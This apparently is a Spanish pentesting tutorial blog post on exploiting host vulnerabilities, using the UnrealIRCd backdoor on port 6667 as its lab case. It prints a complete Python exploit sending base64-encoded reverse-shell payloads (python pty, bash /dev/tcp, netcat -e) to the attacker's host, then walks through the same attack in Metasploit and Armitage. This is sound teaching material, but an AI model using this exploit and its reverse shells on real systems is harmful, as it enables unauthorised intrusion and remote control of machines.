<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Explotación de vulnerabilidades en Hosts" /><meta name="author" content="Javier Fernández Santos" /><meta property="og:locale" content="es" /><meta name="description" content="Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan." /><meta property="og:description" content="Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan." /><link rel="canonical" href="https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/" /><meta property="og:url" content="https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/" /><meta property="og:site_name" content="JaviFS97" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-07-04T03:17:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Explotación de vulnerabilidades en Hosts" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Javier Fernández Santos"},"description":"Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan.","url":"https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/"},"headline":"Explotación de vulnerabilidades en Hosts","dateModified":"2021-07-04T03:17:00+02:00","datePublished":"2021-07-04T03:17:00+02:00","@context":"https://schema.org"}</script><title>Explotación de vulnerabilidades en Hosts | JaviFS97</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="JaviFS97"><meta name="application-name" content="JaviFS97"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">JaviFS97</a></div><div class="site-subtitle font-italic">Welcome! I'm javier, and in this blog is my personal space where I share articles on certain topics, research I do in my lab, CTF write-ups, and quick notes on things I want to remember. and quick notes on things I want to remember.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/JaviFS97" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/JaviFS97" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Explotación de vulnerabilidades en Hosts</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Explotación de vulnerabilidades en Hosts</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/JaviFS97">Javier Fernández Santos</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2021-07-04 03:17:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 4, 2021, 3:17 AM +0200" >Jul 4, 2021</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1765 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p>Durante los posts anteriores hemos visto métodos para recopilar y analizar información sobre nuestros objetivos. Durante este post veremos como explotar (en Hosts) aquellas vulnerabilidades que presentan.</p><h1 id="contenido">Contenido</h1><ul><li><a href="#objetivo">Objetivo</a><li><a href="#explotación-manual-de-vulnerabilidades">Explotación manual de vulnerabilidades</a><ul><li><a href="#caso-de-uso">Caso de uso</a></ul><li><a href="#explotación-automática-de-vulnerabilidades">Explotación automática de vulnerabilidades</a><ul><li><a href="#metasploit">Metasploit</a><ul><li><a href="#componentes">Componentes</a><li><a href="#módulos">Módulos</a><li><a href="#comandos">Comandos</a><li><a href="#caso-de-uso-1">Caso de uso</a><li><a href="#importando-a-metasploit-análisis-de-vulnerabilidades-de-nessus">Importando a Metasploit análisis de vulnerabilidades (de Nessus)</a></ul><li><a href="#armitage-interfaz-gráfica-de-metasploit">Armitage, interfaz gráfica de Metasploit</a></ul></ul><h1 id="objetivo">Objetivo</h1><p>Consiste en el uso de técnicas que permiten al analista <strong>aprovechar una vulnerabilidad identificada (sección análisis de vulnerabilidades) para obtener algún beneficio</strong>. Se corresponde con una de las fases más importantes e intrusivas del proceso de Hacking Ético. Deben tenerse muy en cuenta las herramientas de protección y detección que utiliza la organización (Antivirus, EDR, IPS, IDS, HIDS, WAF, etc).</p><p>Se puede realizar de dos maneras:</p><ul><li>Explotación manual.<li>Explotación automática.</ul><h1 id="explotación-manual-de-vulnerabilidades">Explotación manual de vulnerabilidades</h1><p>Una vez halladas vulnerabilidades gracias a las fases anteriores, podemos explotar dichas vulnerabilidades de manera manual, para ello debemos seguir los siguientes pasos:</p><ol><li>Buscar la vulnerabilidad.<li>Buscar/crear el exploit.<li>Incluir un payload en el exploit.<li>Ejecutar el exploit contra la máquina objetivo para intentar ganar acceso.</ol><h2 id="caso-de-uso">Caso de uso<a href="#caso-de-uso"><i class="fas fa-hashtag"></i></a></h2></h2><p>Como ejemplo, vamos a realizar una explotación manual sobre la máquina objetivo usada en fases anteriores. En concreto sobre este servicio, el irc, presente en el puerto 6667 de la máquina objetivo. Podemos observar que hay un backdoor que nos va a permitir ganar acceso a la máquina. <img data-proofer-ignore data-src="/assets/img/posts/20210704/ExplotandoVulnerabilidad1.png" alt="Vulnerabilidad IRC" class="shadow" style="min-width: 70%;" /> <em>Vulnerabilidad IRC</em></p><p>Creamos o buscamos un exploit para aprovechar esa vulnerabilidad. En este caso hemos encontrado un exploit en internet con el siguiente código:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="c1"># Sets the target ip and port from argparse
</span><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'ip'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'target ip'</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'port'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'target port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-payload'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'set payload type'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">'python'</span><span class="p">,</span> <span class="s">'netcat'</span><span class="p">,</span> <span class="s">'bash'</span><span class="p">])</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="c1"># Sets the local ip and port (address and port to listen on)
</span><span class="n">local_ip</span> <span class="o">=</span> <span class="s">''</span>  <span class="c1"># CHANGE THIS
</span><span class="n">local_port</span> <span class="o">=</span> <span class="s">''</span>  <span class="c1"># CHANGE THIS 
</span>
<span class="c1"># The different types of payloads that are supported
</span><span class="n">python_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'python -c "import os;import pty;import socket;tLnCwQLCel=</span><span class="se">\'</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="se">\'</span><span class="s">;EvKOcV=</span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s">;QRRCCltJB=socket.socket(socket.AF_INET,socket.SOCK_STREAM);QRRCCltJB.connect((tLnCwQLCel,EvKOcV));os.dup2(QRRCCltJB.fileno(),0);os.dup2(QRRCCltJB.fileno(),1);os.dup2(QRRCCltJB.fileno(),2);os.putenv(</span><span class="se">\'</span><span class="s">HISTFILE</span><span class="se">\'</span><span class="s">,</span><span class="se">\'</span><span class="s">/dev/null</span><span class="se">\'</span><span class="s">);pty.spawn(</span><span class="se">\'</span><span class="s">/bin/bash</span><span class="se">\'</span><span class="s">);QRRCCltJB.close();" '</span>
<span class="n">bash_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s"> 0&gt;&amp;1'</span>
<span class="n">netcat_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'nc -e /bin/bash </span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">local_port</span><span class="si">}</span><span class="s">'</span>

<span class="c1"># our socket to interact with and send payload
</span><span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">create_connection</span><span class="p">((</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
<span class="k">except</span> <span class="n">socket</span><span class="p">.</span><span class="n">error</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'connection to target failed...'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">error</span><span class="p">)</span>
    
<span class="c1"># craft out payload and then it gets base64 encoded
</span><span class="k">def</span> <span class="nf">gen_payload</span><span class="p">(</span><span class="n">payload_type</span><span class="p">):</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload_type</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s">'echo </span><span class="si">{</span><span class="n">base</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s"> |base64 -d|/bin/bash'</span>

<span class="c1"># all the different payload options to be sent
</span><span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">payload</span> <span class="o">==</span> <span class="s">'python'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="p">.</span><span class="n">sendall</span><span class="p">((</span><span class="sa">f</span><span class="s">'AB; </span><span class="si">{</span><span class="n">gen_payload</span><span class="p">(</span><span class="n">python_payload</span><span class="p">)</span><span class="si">}</span><span class="s"> </span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'connection made, but failed to send exploit...'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">payload</span> <span class="o">==</span> <span class="s">'netcat'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="p">.</span><span class="n">sendall</span><span class="p">((</span><span class="sa">f</span><span class="s">'AB; </span><span class="si">{</span><span class="n">gen_payload</span><span class="p">(</span><span class="n">netcat_payload</span><span class="p">)</span><span class="si">}</span><span class="s"> </span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'connection made, but failed to send exploit...'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">payload</span> <span class="o">==</span> <span class="s">'bash'</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span><span class="p">.</span><span class="n">sendall</span><span class="p">((</span><span class="sa">f</span><span class="s">'AB; </span><span class="si">{</span><span class="n">gen_payload</span><span class="p">(</span><span class="n">bash_payload</span><span class="p">)</span><span class="si">}</span><span class="s"> </span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'connection made, but failed to send exploit...'</span><span class="p">)</span>
    
<span class="c1">#check display any response from the server
</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">if</span> <span class="n">data</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Exploit sent successfully!'</span><span class="p">)</span>
</pre></table></code></div></div><p>El exploit abre un socket contra la máquina objetivo que indiquemos por parámetros (<code class="language-plaintext highlighter-rouge">exploit.py &lt;ip_objetivo&gt; &lt;puerto_objetivo&gt; -payload &lt;python/netcat/bash&gt;</code>) y envía un payload con el objetivo de establecer una conexión reversa (reverse shell) con nuestra máquina (establecer las variables local_ip y local_port). Necesitamos colocar un “listener” sobre el puerto que hemos indicado en local_port para que la máquina objetivo establezca conexión. Si usamos netcat sería -&gt; <code class="language-plaintext highlighter-rouge">nc -l -p &lt;local_port&gt;</code>. Si todo sale de manera satisfactoria, en la misma terminal donde pusimos el listener aparecerá la shell de la máquina objetivo.</p><p><em><strong>[IMPORTANTE]</strong></em> –&gt; ¿Por qué existe el mismo payload en distintos lenguajes? No sabemos qué interpretes tiene instalado la máquina destino. Si no tiene instalado el interprete de python no entenderá el payload que le hemos enviado. Por esta razón hay más de uno.</p><h1 id="explotación-automática-de-vulnerabilidades">Explotación automática de vulnerabilidades</h1><p>La lista de vulnerabilidades de la máquina objetivo recopiladas puede ser muy grande, realizar una explotación manual sobre todas ellas puede llegar a ser tedioso y lento. Por esta razón existen herramientas que se encargan de automatizar esta fase.</p><h2 id="metasploit">Metasploit<a href="#metasploit"><i class="fas fa-hashtag"></i></a></h2></h2><p>Proyecto Open Source que busca ofrecer herramientas para la creación y ejecución de exploits que aprovechen las vulnerabilidades halladas en las auditorías de seguridad.</p><p>A continuación, veremos de forma breve la composición de Metasploit, sus comandos principales y la manera en que podemos utilizarlo.</p><h3 id="componentes">Componentes<a href="#componentes"><i class="fas fa-hashtag"></i></a></h3></h3><p>Metasploit es considerado un framework en el que están integradas un conjunto de herramientas cada una de las cuales nos ofrece una función determinada.</p><div class="table-wrapper"><table><thead><tr><th>Componente<th>Funcionalidad<tbody><tr><td>msfvenom<td>Integra <code class="language-plaintext highlighter-rouge">msfpayload</code>, que se encarga de la generación de payloads en diferentes lenguajes de programación, y la posibilidad de inyectarlos en otros archivos. También integra <code class="language-plaintext highlighter-rouge">msfencode</code>, que ofrece ofuscación a payloads.<tr><td>msfd<td>Gestor de conexiones remotas de Metasploit. Ofrece un servicio que queda a la escucha en un puerto determinado.<tr><td>msfconsole<td>Componente que permite la ejecución de <code class="language-plaintext highlighter-rouge">módulos</code> mediante una interfaz de línea de comandos.</table></div><p>El que más nos interesa es el último de la lista, msfconsole, ya que es el que nos va a permitir explotar las vulnerabilidades encontradas durante la auditoría.</p><h3 id="módulos">Módulos<a href="#módulos"><i class="fas fa-hashtag"></i></a></h3></h3><p>Un módulo no es más que un código desarrollado para llevar a cabo una o varias acciones determinadas. Dentro de msfconsole disponemos de un importante número de ellos (se van actualizando de manera continua gracias a la comunidad), pero si necesitamos algo más especifico tenemos la posibilidad de programar nosotros mismos el nuestro.</p><p>Existen 7 tipos de módulos:</p><div class="table-wrapper"><table><thead><tr><th>Nombre módulo<th>Descripción<tbody><tr><td>Exploits<td>Módulos encargados de explotar alguna vulnerabilidad.<tr><td>Auxiliary<td>Módulos que ofrecen funcionalidades extra. Desde búsqueda pasiva hasta activa.<tr><td>Post<td>Módulos dedicados a labores post-explotación. Son comunes en este apartado las tareas de mantenimiento de la conexión con la máquina objetivo, el robo periódico de información, el pivoting entre diferentes máquinas o el escalado de privilegios.<tr><td>Payloads<td>Módulos que realizan acciones determinadas dentro del sistema en el que hemos conseguido penetrar.<tr><td>Encoders<td>Se encargan de hacer más difíciles de detectar, por antivirus o sistemas de detección de intrusos, los códigos generados mediante otros módulos.<tr><td>NOPs<td>Contienen herramientas que generar instrucciones NOPs (nulas) en ensamblador para los payloads con los que trabajaremos.<tr><td>Evasion<td>Permiten llevar a cabo técnicas de evasión ante la protección de los antivirus.</table></div><h3 id="comandos">Comandos<a href="#comandos"><i class="fas fa-hashtag"></i></a></h3></h3><p>Hay un conjunto de comandos principales que nos van a permitir comenzar a trabajar con Metasploit. Para empezar nos quedamos con los siguientes:</p><div class="table-wrapper"><table><thead><tr><th>Comando<th>Descripción<tbody><tr><td>help<td>Muestra la ayuda de la aplicación.<tr><td>show<td>Muestra las opciones que tiene aquello sobre lo que se consulta.<tr><td>set<td>Comando que otorga un valor determinado a un parámetro.<tr><td>setg<td>La misma función que <code class="language-plaintext highlighter-rouge">set</code>, pero a nivel global de la aplicación.<tr><td>search<td>Busca coincidencias sobre aquello que busquemos dentro del contenido de Metasploit.<tr><td>info<td>Propociona información sobre el módulo que consultemos.<tr><td>save<td>guarda la configuración que hay en el momento de ejectuarlo. De modo que puede ser recuperada en cualquier momento.<tr><td>use<td>Indica al framework el módulo que se va a utilizar para que lo cargue en la consola.<tr><td>run<td>Para ejecutar módulos tipo auxiliary.<tr><td>exploit<td>Ejecuta el exploit que tengamos cargado en ese momento, con la configuración que hayamos establecido.<tr><td>back<td>Comando de retroceso durante el uso de Metasploit.<tr><td>check<td>Evalúa si el host objetivo es vulnerable al módulo que hemos escogido.<tr><td>sessions<td>Gestor de conexiones abiertas con hosts objetivos. Mediante las opciones del comando podremos ir moviéndonos entre todas las conexiones que tengamos.</table></div><h3 id="caso-de-uso-1">Caso de uso<a href="#caso-de-uso-1"><i class="fas fa-hashtag"></i></a></h3></h3><p>Vamos a explotar la vulnerabilidad que explotamos de manera manual en el apartado anterior.</p><p>Lo primero que hay que hacer es buscar las coincidencias que haya de la vulnerabilidad <code class="language-plaintext highlighter-rouge">unrealirc</code> dentro de Metasploit, para ello ejecutamos el comando <code class="language-plaintext highlighter-rouge">search unrealirc</code>. Obteniendo la siguiente salida: <img data-proofer-ignore data-src="/assets/img/posts/20210704/ExplotandoVulnerabilidadMestasploit1.png" alt="Buscando exploit en Metasploit" class="shadow" style="min-width: 70%;" /> <em>Buscando exploit en Metasploit</em></p><p>En este caso solo encuentra un exploit, para usarlo ejecutamos el siguiente comando <code class="language-plaintext highlighter-rouge">use &lt;nombre_módulo&gt;</code>, en este caso, nombre_módulo = exploit/unix/irc/unreal_ircd_3281_backdoor. Una vez hecho, se entra al módulo para configurarlo (ver que aparece en rojo el módulo que estamos configurando).</p><p>Para ver qué hay que configurar del módulo, ejecutar el comando <code class="language-plaintext highlighter-rouge">show options</code> (con <code class="language-plaintext highlighter-rouge">show advanced</code> veremos la configuración avanzada), obtendremos la siguiente salida: <img data-proofer-ignore data-src="/assets/img/posts/20210704/ExplotandoVulnerabilidadMestasploit2.png" alt="Configurando opciones del exploit en Metasploit" class="shadow" style="min-width: 70%;" /> <em>Configurando opciones del exploit en Metasploit</em></p><p>En este caso nos pide dos parámetros, la ip de la máquina objetivo (RHOSTS) y el puerto (RPORT) que ya viene configurada en el puerto por defecto de ese servicio. Para configurar la ip, ejecutar el comando <code class="language-plaintext highlighter-rouge">set rhosts &lt;ip&gt;</code>.</p><p>Si ahora ejecutamos el exploit mediante el comando <code class="language-plaintext highlighter-rouge">exploit</code> ejecutará todos los exploit configurados. El problema es que en nuestro caso hemos configurado un exploit pero no hemos definido el payload que va a usar. Por eso obtenemos el siguiente resultado: <img data-proofer-ignore data-src="/assets/img/posts/20210704/ExplotandoVulnerabilidadMestasploit3.png" alt="Asignando payload en Metasploit" class="shadow" style="min-width: 70%;" /> <em>Asignando payload en Metasploit</em></p><p>Para añadir un payload al exploit, primero debemos saber cuales son compatibles con nuestro exploit, para ello ejecutamos el comando <code class="language-plaintext highlighter-rouge">show payloads</code>. Escogemos el que queramos mediante el comando <code class="language-plaintext highlighter-rouge">set payload &lt;payload&gt;</code>.</p><p>Si volvemos a ejecutar el comando <code class="language-plaintext highlighter-rouge">exploit</code> veremos que todo sale correctamente y obtenemos una shell reversa de la máquina objetivo.</p><h3 id="importando-a-metasploit-análisis-de-vulnerabilidades-de-nessus">Importando a Metasploit análisis de vulnerabilidades (de Nessus)<a href="#importando-a-metasploit-análisis-de-vulnerabilidades-de-nessus"><i class="fas fa-hashtag"></i></a></h3></h3><p>Además de los comandos que vimos anteriormente, Metasploit incorpora otro conjunto de comandos denominados “Database Backend” que permiten recopilar información desde varias fuentes externas y almacenarlas en una base de datos propia para poder utilizarla posteriormente.</p><div class="table-wrapper"><table><thead><tr><th>Comando<th>Descripción<tbody><tr><td>db_import<td>Importa los datos de un fichero a la base de datos de Metasploit.<tr><td>db_export<td>Exporta el contenido de la base de datos a un fichero.<tr><td>hosts<td>Muestra todos los objetivos que tenemos en la base de datos.<tr><td>services<td>Muestra todos los servicios que tenemos en la base de datos.<tr><td>vulns<td>Muestra todas las vulnerabilidades que hay almacenadas en la base de datos.</table></div><p>Para obtener los resultados del análisis de Nessus, accedemos a su interfaz gráfica y exportamos en análisis (formato .nessus). <img data-proofer-ignore data-src="/assets/img/posts/20210704/ImportandoNessus1.png" alt="Análisis realizado en Nessus" class="shadow" style="min-width: 70%;" /> <em>Análisis realizado en Nessus</em></p><p>Ese archivo (.nessus) es el que vamos a importar en Metasploit por medio del comando <code class="language-plaintext highlighter-rouge">db_import &lt;nombre_fichero&gt;.nessus</code>. <img data-proofer-ignore data-src="/assets/img/posts/20210704/ImportandoNessus2.png" alt="Importando análisis de Nessus a Metasploit" class="shadow" style="min-width: 70%;" /> <em>Importando análisis de Nessus a Metasploit</em></p><p>Si queremos saber qué objetivos tiene nuestro análisis, podemos ejecutar el comando <code class="language-plaintext highlighter-rouge">Hosts</code>. Si queremos ver qué servicios tiene habilitados un objetivo en concreto, ejecutar el comando <code class="language-plaintext highlighter-rouge">services &lt;ip&gt;</code>. Si queremos saber las vulnerabilidades que presenta un objetivo, ejecutar el comando <code class="language-plaintext highlighter-rouge">vulns &lt;ip&gt;</code>. <img data-proofer-ignore data-src="/assets/img/posts/20210704/ImportandoNessus3.png" alt="Buscando vulnerabilidades halladas en el análisis de Nessus" class="shadow" style="min-width: 70%;" /> <em>Buscando vulnerabilidades halladas en el análisis de Nessus</em></p><h2 id="armitage-interfaz-gráfica-de-metasploit">Armitage, interfaz gráfica de Metasploit<a href="#armitage-interfaz-gráfica-de-metasploit"><i class="fas fa-hashtag"></i></a></h2></h2><p>Presenta una interfaz gráfica para realizar las mismas acciones que desde la terminal <img data-proofer-ignore data-src="/assets/img/posts/20210704/armitage.png" alt="Interfaz gráfica Armitage" class="shadow" style="min-width: 70%;" /> <em>Interfaz gráfica Armitage</em></p><p>Por ejemplo, podemos aprovechar la misma vulnerabilidad que aprovechamos antes (unrealirc). Como se puede observar presenta los mismos parámetros que tuvimos que rellenar en el caso de uso anterior. <img data-proofer-ignore data-src="/assets/img/posts/20210704/armitage2.png" alt="Explotando vulnerabilidad IRC en armitage" class="shadow" style="min-width: 70%;" /> <em>Explotando vulnerabilidad IRC en armitage</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ciberseguridad/'>Ciberseguridad</a>, <a href='/categories/seguridad-ofensiva/'>Seguridad Ofensiva</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/pentesting/" class="post-tag no-text-decoration" >Pentesting</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >Metasploit</a> <a href="/tags/armitage/" class="post-tag no-text-decoration" >Armitage</a> <a href="/tags/nmap/" class="post-tag no-text-decoration" >NMAP</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >Exploit</a> <a href="/tags/payload/" class="post-tag no-text-decoration" >Payload</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Explotación de vulnerabilidades en Hosts - JaviFS97&url=https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Explotación de vulnerabilidades en Hosts - JaviFS97&u=https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Explotación de vulnerabilidades en Hosts - JaviFS97&url=https://javifs97.github.io/posts/seg-ofensiva-explotacion-vuln-host/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 